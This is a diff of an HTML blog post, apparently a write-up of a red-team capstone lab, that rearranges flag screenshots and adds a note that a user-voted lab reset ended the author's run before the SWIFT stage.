+<figure id="flag-15"><a href="/assets/img/posts/red-team-capstone/page-49-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-49-figure-01.png" alt="Flag 15" width="1016" height="382" loading="lazy"></a><figcaption>Flag 15</figcaption></figure>
+<figure id="flag-16"><a href="/assets/img/posts/red-team-capstone/page-48-figure-04.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-04.png" alt="Flag 16" width="1016" height="448" loading="lazy"></a><figcaption>Flag 16</figcaption></figure>
+</div>
 
-<h3 id="flag-16">Flag 16:</h3>
 
-<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-48-figure-04.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-04.png" alt="Flag 16" width="1016" height="448" loading="lazy"></a></figure>
-</section>
-
-<!-- PDF page 49 -->
-<section id="pdf-page-49" class="pdf-source-section" data-pdf-page="49" aria-label="Source page 49">
-<h3 id="flag-15">Flag 15</h3>
-
-<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-49-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-49-figure-01.png" alt="Flag 15" width="1016" height="382" loading="lazy"></a></figure>
-
-<h3 id="flag-9">Flag 9</h3>
-
-<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-49-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-49-figure-02.png" alt="Flag 9" width="1016" height="370" loading="lazy"></a></figure>
-
-<h3 id="flag-10">Flag 10</h3>
-
-<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-49-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-49-figure-03.png" alt="Flag 10" width="1016" height="288" loading="lazy"></a></figure>
-</section>
-
-<!-- PDF page 50 -->
-<section id="pdf-page-50" class="pdf-source-section" data-pdf-page="50" aria-label="Source page 50">
-<h3 id="flag-11">Flag 11</h3>
-
-<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-50-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-50-figure-01.png" alt="Flag 11" width="1016" height="356" loading="lazy"></a></figure>
-
-<h3 id="flag-12">Flag 12</h3>
-
-<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-50-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-50-figure-02.png" alt="Flag 12" width="1016" height="304" loading="lazy"></a></figure>
-
-<h3 id="flag-13">Flag 13</h3>
-
-<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-50-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-50-figure-03.png" alt="Flag 13" width="1016" height="368" loading="lazy"></a></figure>
 </section>
 
 <!-- PDF page 51 -->
 <section id="pdf-page-51" class="pdf-source-section" data-pdf-page="51" aria-label="Source page 51">
 <h2 id="where-the-attempt-ended">Where the Attempt Ended</h2>
-<h3 id="flag-14">Flag 14</h3>
 
-<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-51-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-51-figure-01.png" alt="Flag 14" width="1016" height="444" loading="lazy"></a></figure>
 
 <p>The final recorded network diagram:</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-51-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-51-figure-02.png" alt="Final network diagram" width="1016" height="652" loading="lazy"></a></figure>
 
 <p>The lab reset before I reached the SWIFT stage, and I lost access. I was doing the room for my Certificate IV assessment, so I kept the work from that run rather than starting over in a fresh deployment.</p>
+
+<p>Because this room runs a complex environment, users can vote to reset it when issues start affecting the lab. That user-voted reset is what caused this run to end.</p>
 
 <p>I did not continue through the jump host into the SWIFT application or make the final transfer.</p>
 
